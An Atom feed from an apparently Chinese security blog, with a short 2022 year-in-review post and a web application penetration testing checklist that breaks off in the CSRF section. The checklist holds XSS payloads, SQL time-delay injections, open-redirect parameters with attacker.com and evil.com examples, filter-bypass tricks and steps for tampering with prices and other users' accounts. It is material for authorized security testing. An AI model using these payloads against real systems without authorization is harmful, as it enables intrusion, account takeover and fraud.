<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sys71m</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.sys71m.top/"/>
  <updated>2022-12-24T16:42:12.904Z</updated>
  <id>https://www.sys71m.top/</id>
  
  <author>
    <name>Sys71m</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2022小总结</title>
    <link href="https://www.sys71m.top/2022/12/25/2022%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <id>https://www.sys71m.top/2022/12/25/2022%E5%B0%8F%E6%80%BB%E7%BB%93/</id>
    <published>2022-12-24T16:39:06.000Z</published>
    <updated>2022-12-24T16:42:12.904Z</updated>
    
    <content type="html"><![CDATA[<p>2022，不算好，也不算坏，年初定的几个flag，有的完成了一半，有的没完成。总的来说，不及格。</p><a id="more"></a>  <h3 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h3><p>上半年安全主推IAST，下半年建设SOC平台。干的事情很多，但大多事情都偏向于开发、漏洞验证、运营方向，对新出的CVE漏洞研究不足。此外，开发人员其实对安全并没有多重视，在开发编程过程中往往不会考虑代码的安全性，安全修复更多的是需要安全人员去推动，常见的重定向、xxe、sql注入在新的项目中还会再次出现。因此，一个完整的安全开发流程十分重要。代码卡点我感觉是能提高整体安全的一个手段，增加研发对于安全重视程度，让研发去主动修复漏洞。但对于老的项目，往往会以没有排期、不敢动代码等理由，申请白名单，这就需要安全人员去人工评估项目的安全性，主要针对可利用难度低、危害大的漏洞进行修复，再进行上线，或推动项目下线。</p><p>另外，今年互联网的日子确实不好过，无论大公司、小公司都在裁员。身边的同事也有的被裁。互联网的明天会如何，还是未知，能做的只有在这寒气下，厚积薄发。</p><h3 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h3><p>去年软考考了一个信息安全工程师证书，今年考了一个高级项目管理工程师的证书(ps:主要是报名费便宜)，也算有点收获。关于CISP、CISSP以后也会考，现在还达不到工作年限要求。另外最近在看go语言，对于高并发的支持太爱了，打算以后的脚本语言由python逐渐转到go上边。</p><p>不足，blog更新很少。codeql的学习没有达到我想要的目标。web3.0想入门，感觉是未来的一个趋势，但一直拖着没有看。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>游戏的时间明显变少了，陪伴多年的英雄联盟端游，很久没有登录了，偶尔打打手游。</p><p>想养只猫，和学门乐器。</p><p>希望快点回到疫情前的那段日子吧。</p><p>2023，继续加油~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2022，不算好，也不算坏，年初定的几个flag，有的完成了一半，有的没完成。总的来说，不及格。&lt;/p&gt;
    
    </summary>
    
    
      <category term="日常" scheme="https://www.sys71m.top/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
      <category term="总结" scheme="https://www.sys71m.top/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="日常" scheme="https://www.sys71m.top/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>Web Application Penetration Testing Checklist</title>
    <link href="https://www.sys71m.top/2022/10/30/Web-Application-Penetration-Testing-Checklist/"/>
    <id>https://www.sys71m.top/2022/10/30/Web-Application-Penetration-Testing-Checklist/</id>
    <published>2022-10-30T07:29:33.000Z</published>
    <updated>2022-10-30T07:42:48.170Z</updated>
    
    <content type="html"><![CDATA[<p>SecCheckList</p><a id="more"></a>  <h1 id="Web-Application-Penetration-Testing-Checklist"><a href="#Web-Application-Penetration-Testing-Checklist" class="headerlink" title="Web Application Penetration Testing Checklist"></a>Web Application Penetration Testing Checklist</h1><ul><li><p><strong>Recon Phase</strong></p><ul><li style="list-style: none"><input type="checkbox"> Identify web server, technologies and database</li><li style="list-style: none"><input type="checkbox"> Subsidiary and Acquisition Enumeration</li><li style="list-style: none"><input type="checkbox"> Reverse Lookup</li><li style="list-style: none"><input type="checkbox"> ASN &amp; IP Space Enumeration and Service Enumeration</li><li style="list-style: none"><input type="checkbox"> Google Dorking</li><li style="list-style: none"><input type="checkbox"> Github Recon</li><li style="list-style: none"><input type="checkbox"> Directory Enumeration</li><li style="list-style: none"><input type="checkbox"> IP Range Enumeration</li><li style="list-style: none"><input type="checkbox"> JS Files Analysis</li><li style="list-style: none"><input type="checkbox"> Subdomain Enumeration and Bruteforcing</li><li style="list-style: none"><input type="checkbox"> Subdomain Takeover</li><li style="list-style: none"><input type="checkbox"> Parameter Fuzzing</li><li style="list-style: none"><input type="checkbox"> Port Scanning</li><li style="list-style: none"><input type="checkbox"> Template-Based Scanning(Nuclei)</li><li style="list-style: none"><input type="checkbox"> Wayback History</li><li style="list-style: none"><input type="checkbox"> Broken Link Hijacking</li><li style="list-style: none"><input type="checkbox"> Internet Search Engine Discovery</li><li style="list-style: none"><input type="checkbox"> Misconfigured Cloud Storage</li></ul></li><li><p><strong>Registration Feature Testing</strong></p><ul><li style="list-style: none"><input type="checkbox"> Check for duplicate registration/Overwrite existing user</li><li style="list-style: none"><input type="checkbox"> Check for weak password policy</li><li style="list-style: none"><input type="checkbox"> Check for reuse existing usernames</li><li style="list-style: none"><input type="checkbox"> Check for insufficient email verification process</li><li style="list-style: none"><input type="checkbox"> Weak registration implementation-Allows disposable email addresses</li><li style="list-style: none"><input type="checkbox"> Weak registration implementation-Over HTTP</li><li style="list-style: none"><input type="checkbox"> Overwrite default web application pages by specially crafted username registrations. =&gt; After registration, does your profile link appears something as <a href="http://www.chintan.com/chintan" target="_blank" rel="noopener">www.tushar.com/</a>tushar?</li></ul><p>a. If so, enumerate default folders of web application such as /images, /contact, /portfolio</p><p>b. Do a registration using the username such as images, contact, portfolio</p><p>c. Check if those default folders have been overwritten by your profile link or not.”</p></li><li><p><strong>Session Management Testing</strong></p><ul><li style="list-style: none"><input type="checkbox"> Identify actual session cookie out of bulk cookies in the application</li><li style="list-style: none"><input type="checkbox"> Decode cookies using some standard decoding algorithms such as Base64, hex, URL, etc</li><li style="list-style: none"><input type="checkbox"> Modify cookie.session token value by 1 bit/byte. Then resubmit and do the same for all tokens. Reduce the amount of work you need to perform in order to identify which part of the token is actually being used and which is not</li><li style="list-style: none"><input type="checkbox"> If self-registration is available and you can choose your username, log in with a series of similar usernames containing small variations between them, such as A, AA, AAA, AAAA, AAAB, AAAC, AABA, and so on. If another user-specific data is submitted at login or stored in user profiles (such as an email address)</li><li style="list-style: none"><input type="checkbox"> Check for session cookies and cookie expiration date/time</li><li style="list-style: none"><input type="checkbox"> Identify cookie domain scope</li><li style="list-style: none"><input type="checkbox"> Check for HttpOnly flag in cookie</li><li style="list-style: none"><input type="checkbox"> Check for Secure flag in cookie if the application is over SSL</li><li style="list-style: none"><input type="checkbox"> Check for session fixation i.e. value of session cookie before and after authentication</li><li style="list-style: none"><input type="checkbox"> Replay the session cookie from a different effective IP address or system to check whether the server maintains the state of the machine or not</li><li style="list-style: none"><input type="checkbox"> Check for concurrent login through different machine/IP</li><li style="list-style: none"><input type="checkbox"> Check if any user pertaining information is stored in cookie value or not If yes, tamper it with other user’s data</li><li style="list-style: none"><input type="checkbox"> Failure to Invalidate Session on (Email Change,2FA Activation)</li></ul></li><li><p><strong>Authentication Testing</strong></p><ul><li style="list-style: none"><input type="checkbox"> Username enumeration</li><li style="list-style: none"><input type="checkbox"> Bypass authentication using various SQL Injections on username and password field</li><li><p>[ ] Lack of password confirmation on</p><ul><li style="list-style: none"><input type="checkbox"> Change email address</li><li style="list-style: none"><input type="checkbox"> Change password</li><li style="list-style: none"><input type="checkbox"> Manage 2FA</li></ul></li><li><p>[ ] Is it possible to use resources without authentication? Access violation</p></li><li><p>[ ] Check if user credentials are transmitted over SSL or not</p></li><li><p>[ ] Weak login function HTTP and HTTPS both are available</p></li><li><p>[ ] Test user account lockout mechanism on brute force attack</p><p>Variation : If server blocks instant user requests, then try with time throttle option from intruder and repeat the process again.</p><ul><li style="list-style: none"><input type="checkbox"> Bypass rate limiting by tampering user agent to Mobile User agent</li><li style="list-style: none"><input type="checkbox"> Bypass rate limiting by tampering user agent to Anonymous user agent</li><li style="list-style: none"><input type="checkbox"> Bypass rate liniting by using null byte</li></ul></li><li><p>[ ] Create a password wordlist using cewl command</p></li><li><p>[ ] Test Oauth login functionality</p><ul><li><p>OAuth Roles</p><ul><li style="list-style: none"><input type="checkbox"> Resource Owner → User</li><li style="list-style: none"><input type="checkbox"> Resource Server → Twitter</li><li style="list-style: none"><input type="checkbox"> Client Application → <a href="http://twitterdeck.com/" target="_blank" rel="noopener">Twitterdeck.com</a></li><li style="list-style: none"><input type="checkbox"> Authorization Server → Twitter</li><li style="list-style: none"><input type="checkbox"> client_id → Twitterdeck ID (This is a public, non-secret unique identifier_</li><li style="list-style: none"><input type="checkbox"> client_secret → Secret Token known to the Twitter and Twitterdeck to generate access_tokens</li><li style="list-style: none"><input type="checkbox"> response_type → Defines the token type e.g (code, token, etc.)</li><li style="list-style: none"><input type="checkbox"> scope → The requested level of access Twitterdeck wants</li><li style="list-style: none"><input type="checkbox"> redirect_uri → The URL user is redirected to after the authorization is complete</li><li style="list-style: none"><input type="checkbox"> state → Main CSRF protection in OAuth can persist data between the user being directed to the authorization server and back again</li><li style="list-style: none"><input type="checkbox"> grant_type → Defines the grant_type and the returned token type</li><li style="list-style: none"><input type="checkbox"> code → The authorization code twitter generated, will be like ?code= , the code is used with client_id and client_secret to fetch an access_token</li><li style="list-style: none"><input type="checkbox"> access_token → The token twitterdeck uses to make API requests on behalf of the user</li><li style="list-style: none"><input type="checkbox"> refresh_token → Allows an application to obtain a new access_token without prompting the user</li></ul></li><li><p>Code Flaws</p><ul><li style="list-style: none"><input type="checkbox"> Re-Using the code</li><li style="list-style: none"><input type="checkbox"> Code Predict/Bruteforce and Rate-limit</li><li style="list-style: none"><input type="checkbox"> Is the code for application X valid for application Y?</li></ul></li><li><p>Redirect_uri Flaws</p><ul><li style="list-style: none"><input type="checkbox"> URL isn’t validated at all: ?redirect_uri=<a href="https://attacker.com" target="_blank" rel="noopener">https://attacker.com</a></li><li style="list-style: none"><input type="checkbox"> Subdomains allowed (Subdomain Takeover or Open redirect on those subdomains): ?redirect_uri=<a href="https://sub.twitterdeck.com" target="_blank" rel="noopener">https://sub.twitterdeck.com</a></li><li style="list-style: none"><input type="checkbox"> Host is validated, path isn’t Chain open redirect): ?redirect_uri=<a href="https://twitterdeck.com/callback?redirectUrl=https://evil.com" target="_blank" rel="noopener">https://twitterdeck.com/callback?redirectUrl=https://evil.com</a></li><li style="list-style: none"><input type="checkbox"> Host is validated, path isn’t (Referer leakages): Include external content on HTML page and leak code via Referer</li><li style="list-style: none"><input type="checkbox"> Weak Regexes</li><li style="list-style: none"><input type="checkbox"> Bruteforcing the URL encoded chars after host: redirect_uri=<a href="https://twitterdeck.com§FUZZ§" target="_blank" rel="noopener">https://twitterdeck.com§FUZZ§</a></li><li style="list-style: none"><input type="checkbox"> Bruteforcing the keywords whitelist after host (or on any whitelist open redirect filter): ?redirect_uri=https://§FUZZ§.com</li><li style="list-style: none"><input type="checkbox"> URI validation in place: use typical open redirect payloads</li></ul></li><li><p>State Flaws</p><ul><li style="list-style: none"><input type="checkbox"> Missing State parameter? (CSRF)</li><li style="list-style: none"><input type="checkbox"> Predictable State parameter?</li><li style="list-style: none"><input type="checkbox"> Is State parameter being verified?</li></ul></li><li><p>Misc</p><ul><li><p>[ ] Is client_secret validated?</p></li><li><p>[ ] Pre ATO using facebook phone-number signup</p></li><li><p>[ ] No email validation Pre ATO</p></li></ul></li></ul></li><li><p>[ ] Test 2FA Misconfiguration</p><ul><li style="list-style: none"><input type="checkbox"> Response Manipulation</li><li style="list-style: none"><input type="checkbox"> Status Code</li><li style="list-style: none"><input type="checkbox"> Manipulation</li><li style="list-style: none"><input type="checkbox"> 2FA Code Leakage in Response</li><li style="list-style: none"><input type="checkbox"> 2FA Code Reusability</li><li style="list-style: none"><input type="checkbox"> Lack of Brute-Force Protection</li><li style="list-style: none"><input type="checkbox"> Missing 2FA Code Integrity Validation</li><li style="list-style: none"><input type="checkbox"> With null or 000000</li></ul></li></ul></li><li><p><strong>My Account (Post Login) Testing</strong></p><ul><li style="list-style: none"><input type="checkbox"> Find parameter which uses active account user id. Try to tamper it in order to change the details of the other accounts</li><li style="list-style: none"><input type="checkbox"> Create a list of features that are pertaining to a user account only. Change Email Change Password -Change account details (Name, Number, Address, etc.) Try CSRF</li><li style="list-style: none"><input type="checkbox"> Post login change email id and update with any existing email id. Check if its getting validated on server side or not. Does the application send any new email confirmation link to a new user or not? What if a user does not confirm the link in some time frame?</li><li style="list-style: none"><input type="checkbox"> Open profile picture in a new tab and check the URL. Find email id/user id info. EXIF Geolocation Data Not Stripped From Uploaded Images.</li><li style="list-style: none"><input type="checkbox"> Check account deletion option if application provides it and confirm that via forgot password feature</li><li style="list-style: none"><input type="checkbox"> Change email id, account id, user id parameter and try to brute force other user’s password</li><li style="list-style: none"><input type="checkbox"> Check whether application re authenticates for performing sensitive operation for post authentication features</li></ul></li><li><p><strong>Forgot Password Testing</strong></p><ul><li style="list-style: none"><input type="checkbox"> Failure to invalidate session on Logout and Password reset</li><li style="list-style: none"><input type="checkbox"> Check if forget password reset link/code uniqueness</li><li style="list-style: none"><input type="checkbox"> Check if reset link does get expire or not if its not used by the user for certain amount of time</li><li style="list-style: none"><input type="checkbox"> Find user account identification parameter and tamper Id or parameter value to change other user’s password</li><li style="list-style: none"><input type="checkbox"> Check for weak password policy</li><li style="list-style: none"><input type="checkbox"> Weak password reset implementation Token is not invalidated after use</li><li style="list-style: none"><input type="checkbox"> If reset link has another param such as date and time, then. Change date and time value in order to make active &amp; valid reset link</li><li style="list-style: none"><input type="checkbox"> Check if security questions are asked? How many guesses allowed? –&gt; Lockout policy maintained or not?</li><li style="list-style: none"><input type="checkbox"> Add only spaces in new password and confirmed password. Then Hit enter and see the result</li><li style="list-style: none"><input type="checkbox"> Does it display old password on the same page after completion of forget password formality?</li><li style="list-style: none"><input type="checkbox"> Ask for two password reset link and use the older one from user’s email</li><li style="list-style: none"><input type="checkbox"> Check if active session gets destroyed upon changing the password or not?</li><li style="list-style: none"><input type="checkbox"> Weak password reset implementation Password reset token sent over HTTP</li><li style="list-style: none"><input type="checkbox"> Send continuous forget password requests so that it may send sequential tokens</li><li style="list-style: none"><input type="checkbox"> Adding the header <code>X-Forwarded-Host</code> in the password reset request to change the Host </li></ul></li><li><p><strong>Contact Us Form Testing</strong></p><ul><li style="list-style: none"><input type="checkbox"> Is CAPTCHA implemented on contact us form in order to restrict email flooding attacks?</li><li style="list-style: none"><input type="checkbox"> Does it allow to upload file on the server?</li><li style="list-style: none"><input type="checkbox"> Blind XSS</li></ul></li><li><p><strong>Product Purchase Testing</strong></p><ul><li>Buy Now<ul><li style="list-style: none"><input type="checkbox"> Tamper product ID to purchase other high valued product with low prize</li><li style="list-style: none"><input type="checkbox"> Tamper product data in order to increase the number of product with the same prize</li></ul></li><li>Gift/Voucher<ul><li style="list-style: none"><input type="checkbox"> Tamper gift/voucher count in the request (if any) to increase/decrease the number of vouchers/gifts to be used</li><li style="list-style: none"><input type="checkbox"> Tamper gift/voucher value to increase/decrease the value of the voucher in terms of money. (e.g. $100 is given as a voucher, tamper value to increase, decrease money)</li><li style="list-style: none"><input type="checkbox"> Reuse gift/voucher by using old gift values in parameter tampering</li><li style="list-style: none"><input type="checkbox"> Check the uniqueness of gift/voucher parameter and try guessing other gift/voucher code</li><li style="list-style: none"><input type="checkbox"> Use parameter pollution technique to add the same voucher twice by adding same parameter name and value again with &amp; in the BurpSuite request</li></ul></li><li>Add/Delete Product from Cart<ul><li style="list-style: none"><input type="checkbox"> Tamper user id to delete products from other user’s cart</li><li style="list-style: none"><input type="checkbox"> Tamper cart id to add/delete products from other user’s cart</li><li style="list-style: none"><input type="checkbox"> Identify cart id/user id for cart feature to view the added items from other user’s account</li></ul></li><li>Address<ul><li style="list-style: none"><input type="checkbox"> Tamper BurpSuite request to change other user’s shipping address to yours</li><li style="list-style: none"><input type="checkbox"> Try stored XSS by adding XSS vector on shipping address</li><li style="list-style: none"><input type="checkbox"> Use parameter pollution technique to add two shipping address instead of one trying to manipulate application to send same item on two shipping address</li></ul></li><li>Place Order<ul><li style="list-style: none"><input type="checkbox"> Tamper payment options parameter to change the payment method. E.g. Consider some items cannot be ordered for cash on delivery but tampering request parameters from debit/credit/PayPal/net banking option to cash on delivery may allow you to place order for that particular item</li><li style="list-style: none"><input type="checkbox"> Tamper the amount value for payment manipulation in each main and sub requests and responses</li><li style="list-style: none"><input type="checkbox"> Check if CVV is going in cleartext or not</li><li style="list-style: none"><input type="checkbox"> Check if the application itself processes your card details and then performs a transaction or it calls any third-party payment processing company to perform a transaction</li></ul></li><li>Track Order<ul><li style="list-style: none"><input type="checkbox"> Track other user’s order by guessing order tracking number</li><li style="list-style: none"><input type="checkbox"> Brute force tracking number prefix or suffix to track mass orders for other users</li></ul></li><li>Wish list page testing<ul><li style="list-style: none"><input type="checkbox"> Check if a user A can add/remote products in Wishlist of other user B’s account</li><li style="list-style: none"><input type="checkbox"> Check if a user A can add products into user B’s cart from his/her (user A’s) Wishlist section.</li></ul></li><li>Post product purchase testing<ul><li style="list-style: none"><input type="checkbox"> Check if user A can cancel orders for user B’s purchase</li><li style="list-style: none"><input type="checkbox"> Check if user A can view/check orders already placed by user B</li><li style="list-style: none"><input type="checkbox"> Check if user A can modify the shipping address of placed order by user B</li></ul></li><li>Out of band testing<ul><li style="list-style: none"><input type="checkbox"> Can user order product which is out of stock?</li></ul></li></ul></li><li><p><strong>Banking Application Testing</strong></p><ul><li>Billing Activity<ul><li style="list-style: none"><input type="checkbox"> Check if user ‘A’ can view the account statement for user ‘B’</li><li style="list-style: none"><input type="checkbox"> Check if user ‘A’ can view the transaction report for user ‘B’</li><li style="list-style: none"><input type="checkbox"> Check if user ‘A’ can view the summary report for user ‘B’</li><li style="list-style: none"><input type="checkbox"> Check if user ‘A’ can register for monthly/weekly account statement via email behalf of user ‘B’</li><li style="list-style: none"><input type="checkbox"> Check if user ‘A’ can update the existing email id of user ‘B’ in order to retrieve monthly/weekly account summary</li></ul></li><li>Deposit/Loan/Linked/External Account Checking<ul><li style="list-style: none"><input type="checkbox"> Check if user ‘A’ can view the deposit account summary of user ‘B’</li><li style="list-style: none"><input type="checkbox"> Check for account balance tampering for Deposit accounts</li></ul></li><li>Tax Deduction Inquiry Testing<ul><li style="list-style: none"><input type="checkbox"> Check if user ‘A’ with it’s customer id ‘a’ can see the tax deduction details of user ‘B’ by tampering his/her customer id ‘b’</li><li style="list-style: none"><input type="checkbox"> Check parameter tampering for increasing and decreasing interest rate, interest amount, and tax refund</li><li style="list-style: none"><input type="checkbox"> Check if user ‘A’ can download the TDS details of user ‘B’</li></ul></li><li style="list-style: none"><input type="checkbox"> Check if user ‘A’ can request for the cheque book behalf of user ‘B’.</li><li>Fixed Deposit Account Testing<ul><li style="list-style: none"><input type="checkbox"> Check if is it possible for user ‘A’ to open FD account behalf of user ‘B’</li><li style="list-style: none"><input type="checkbox"> Check if Can user open FD account with the more amount than the current account balance</li></ul></li><li>Stopping Payment on basis of cheque/date range<ul><li style="list-style: none"><input type="checkbox"> Can user ‘A’ stop the payment of user ‘B’ via cheque number</li><li style="list-style: none"><input type="checkbox"> Can user ‘A’ stop the payment on basis of date range for user ‘B’</li></ul></li><li>Status Enquiry Testing<ul><li style="list-style: none"><input type="checkbox"> Can user ‘A’ view the status enquiry of user ‘B’</li><li style="list-style: none"><input type="checkbox"> Can user ‘A’ modify the status enquiry of user ‘B’</li><li style="list-style: none"><input type="checkbox"> Can user ‘A’ post and enquiry behalf of user ‘B’ from his own account</li></ul></li><li>Fund transfer testing<ul><li style="list-style: none"><input type="checkbox"> Is it possible to transfer funds to user ‘C’ instead of user ‘B’ from the user ‘A’ which was intended to transfer from user ‘A’ to user ‘B’</li><li style="list-style: none"><input type="checkbox"> Can fund transfer amount be manipulated?</li><li style="list-style: none"><input type="checkbox"> Can user ‘A’ modify the payee list of user ‘B’ by parameter manipulation using his/her own account</li><li style="list-style: none"><input type="checkbox"> Is it possible to add payee without any proper validation in user ‘A’ ‘s own account or to user ‘B’ ‘s account</li></ul></li><li>Schedule transfer testing<ul><li style="list-style: none"><input type="checkbox"> Can user ‘A’ view the schedule transfer of user ‘B’</li><li style="list-style: none"><input type="checkbox"> Can user ‘A’ change the details of schedule transfer for user ‘B’</li></ul></li><li>Testing of fund transfer via NEFT<ul><li style="list-style: none"><input type="checkbox"> Amount manipulation via NEFT transfer</li><li style="list-style: none"><input type="checkbox"> Check if user ‘A’ can view the NEFT transfer details of user ‘B’</li></ul></li><li>Testing for Bill Payment<ul><li style="list-style: none"><input type="checkbox"> Check if user can register payee without any checker approval</li><li style="list-style: none"><input type="checkbox"> Check if user ‘A’ can view the pending payments of user ‘B’</li><li style="list-style: none"><input type="checkbox"> Check if user ‘A’ can view the payment made details of user ‘B’</li></ul></li></ul></li><li><p><strong>Open Redirection Testing</strong></p><ul><li><p>Common injection parameters</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/&#123;payload&#125;</span><br><span class="line">?next=&#123;payload&#125;</span><br><span class="line">?url=&#123;payload&#125;</span><br><span class="line">?target=&#123;payload&#125;</span><br><span class="line">?rurl=&#123;payload&#125;</span><br><span class="line">?dest=&#123;payload&#125;</span><br><span class="line">?destination=&#123;payload&#125;</span><br><span class="line">?redir=&#123;payload&#125;</span><br><span class="line">?redirect_uri=&#123;payload&#125;</span><br><span class="line">?redirect_url=&#123;payload&#125;</span><br><span class="line">?redirect=&#123;payload&#125;</span><br><span class="line">/redirect/&#123;payload&#125;</span><br><span class="line">/cgi-bin/redirect.cgi?&#123;payload&#125;</span><br><span class="line">/out/&#123;payload&#125;</span><br><span class="line">/out?&#123;payload&#125;</span><br><span class="line">?view=&#123;payload&#125;</span><br><span class="line">/login?to=&#123;payload&#125;</span><br><span class="line">?image_url=&#123;payload&#125;</span><br><span class="line">?go=&#123;payload&#125;</span><br><span class="line">?return=&#123;payload&#125;</span><br><span class="line">?returnTo=&#123;payload&#125;</span><br><span class="line">?return_to=&#123;payload&#125;</span><br><span class="line">?checkout_url=&#123;payload&#125;</span><br><span class="line">?continue=&#123;payload&#125;</span><br><span class="line">?return_path=&#123;payload&#125;</span><br></pre></td></tr></table></figure></li><li><p>[ ] Use burp ‘find’ option in order to find parameters such as URL, red, redirect, redir, origin, redirect_uri, target etc</p></li><li><p>[ ] Check the value of these parameter which may contain a URL</p></li><li><p>[ ] Change the URL value to <a href="http://www.chintan.com/" target="_blank" rel="noopener">www.tushar.com</a> and check if gets redirected or not</p></li><li><p>[ ] Try Single Slash and url encoding</p></li><li><p>[ ] Using a whitelisted domain or keyword</p></li><li><p>[ ] Using // to bypass http blacklisted keyword</p></li><li><p>[ ] Using https: to bypass // blacklisted keyword</p></li><li><p>[ ] Using \ to bypass // blacklisted keyword</p></li><li><p>[ ] Using \/\/ to bypass // blacklisted keyword</p></li><li><p>[ ] Using null byte %00 to bypass blacklist filter</p></li><li><p>[ ] Using ° symbol to bypass</p></li></ul></li><li><p><strong>Host Header Injection</strong></p><ul><li style="list-style: none"><input type="checkbox"> Supply an arbitrary Host header</li><li style="list-style: none"><input type="checkbox"> Check for flawed validation</li><li>Send ambiguous requests<ul><li style="list-style: none"><input type="checkbox"> Inject duplicate Host headers</li><li style="list-style: none"><input type="checkbox"> Supply an absolute URL</li><li style="list-style: none"><input type="checkbox"> Add line wrapping</li></ul></li><li style="list-style: none"><input type="checkbox"> Inject host override headers</li></ul></li><li><p><strong>SQL Injection Testing</strong></p><ul><li><p>Entry point detection</p><ul><li style="list-style: none"><input type="checkbox"> Simple characters</li><li style="list-style: none"><input type="checkbox"> Multiple encoding</li><li style="list-style: none"><input type="checkbox"> Merging characters</li><li style="list-style: none"><input type="checkbox"> Logic Testing</li><li style="list-style: none"><input type="checkbox"> Weird characters</li></ul></li><li><p>Use SQLmap to identify vulnerabile parameters</p><ul><li style="list-style: none"><input type="checkbox"> Fill form in browser GUI submit it normally</li><li style="list-style: none"><input type="checkbox"> Go to history tab in burpsuite and find the relevent request</li><li style="list-style: none"><input type="checkbox"> Right click and select the option “copy to file”</li><li style="list-style: none"><input type="checkbox"> Save file as anyname.txt</li><li style="list-style: none"><input type="checkbox"> SQLmap command to run</li><li style="list-style: none"><input type="checkbox"> python <a href="http://sqlmap.py/" target="_blank" rel="noopener">sqlmap.py</a> r ~/Desktop/textsqli.txt proxy= <a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a></li></ul></li><li><p>[ ] Run SQL injection scanner on all requests</p></li><li><p>Bypassing WAF</p><ul><li style="list-style: none"><input type="checkbox"> Using Null byte before SQL query</li><li style="list-style: none"><input type="checkbox"> Using SQL inline comment sequence</li><li style="list-style: none"><input type="checkbox"> URL encoding</li><li style="list-style: none"><input type="checkbox"> Changing Cases (uppercase/lowercase)</li><li style="list-style: none"><input type="checkbox"> Use SQLMAP tamper scripts</li></ul></li><li><p>Time Delays</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Oracle       dbms_pipe.receive_message((&apos;a&apos;),10)</span><br><span class="line"></span><br><span class="line">Microsoft   WAITFOR DELAY &apos;0:0:10&apos;</span><br><span class="line"></span><br><span class="line">PostgreSQL   SELECT pg_sleep(10)</span><br><span class="line"></span><br><span class="line">MySQL       SELECT sleep(10)</span><br></pre></td></tr></table></figure></li><li><p>Conditional Delays</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Oracle       SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN &apos;a&apos;||dbms_pipe.receive_message((&apos;a&apos;),10) ELSE NULL END FROM dual</span><br><span class="line"></span><br><span class="line">Microsoft   IF (YOUR-CONDITION-HERE) WAITFOR DELAY &apos;0:0:10&apos;</span><br><span class="line"></span><br><span class="line">PostgreSQL   SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</span><br><span class="line"></span><br><span class="line">MySQL       SELECT IF(YOUR-CONDITION-HERE,sleep(10),&apos;a&apos;)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>Cross-Site Scripting Testing</strong></p><ul><li style="list-style: none"><input type="checkbox"> Try XSS using QuickXSS tool by theinfosecguy</li><li style="list-style: none"><input type="checkbox"> Upload file using<code>&#39;&quot;&gt;&lt;img src=x onerror=alert(document.domain)&gt;.txt</code></li><li style="list-style: none"><input type="checkbox"> If script tags are banned, use<code>&lt;h1&gt;</code> and other HTML tags</li><li style="list-style: none"><input type="checkbox"> If output is reflected back inside the JavaScript as a value of any variable just use alert(1)</li><li style="list-style: none"><input type="checkbox"> if “ are filtered then use this payload<code>/&gt;&lt;img src=d onerror=confirm(/tushar/);&gt;</code></li><li style="list-style: none"><input type="checkbox"> Upload a JavaScript using Image file</li><li style="list-style: none"><input type="checkbox"> Unusual way to execute your JS payload is to change method from POST to GET. It bypasses filters sometimes</li><li>Tag attribute value<ul><li style="list-style: none"><input type="checkbox"> Input landed -<code>&lt;input type=”text” name=”state” value=”INPUT_FROM_ USER”&gt;</code></li><li style="list-style: none"><input type="checkbox"> Payload to be inserted -<code>“ onfocus=”alert(document.cookie)&quot;</code></li></ul></li><li style="list-style: none"><input type="checkbox"> Syntax Encoding payload<code>“%3cscript%3ealert(document.cookie)%3c/script%3e&quot;</code></li><li>XSS filter evasion<ul><li style="list-style: none"><input type="checkbox"> `&lt; and &gt; can be replace with html entities &lt; and &gt;</li><li style="list-style: none"><input type="checkbox"> You can try an XSS <a href="http://polyglot.Eg" target="_blank" rel="noopener">polyglot.Eg</a>:<code>-javascript:/*-&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload=&#39;+/&quot;/+/onmouseover=1/+/[*/[]/+alert(1)//&#39;&gt;</code></li></ul></li><li>XSS Firewall Bypass<ul><li style="list-style: none"><input type="checkbox"> Check if the firewall is blocking only lowercase</li><li style="list-style: none"><input type="checkbox"> Try to break firewall regex with the new line(\r\n)</li><li style="list-style: none"><input type="checkbox"> Try Double Encoding</li><li style="list-style: none"><input type="checkbox"> Testing for recursive filters</li><li style="list-style: none"><input type="checkbox"> Injecting anchor tag without whitespaces</li><li style="list-style: none"><input type="checkbox"> Try to bypass whitespaces using Bullet</li><li style="list-style: none"><input type="checkbox"> Try to change request method</li></ul></li></ul></li><li><p><strong>CSRF Testing</strong></p><ul><li style="list-style: none"><input type="checkbox"> Validation of CSRF token depends on request method</li><li style="list-style: none"><input type="checkbox"> Validation of CSRF token depends on token being present</li><li style="list-style: none"><input type="checkbox"> CSRF token is not tied to the user 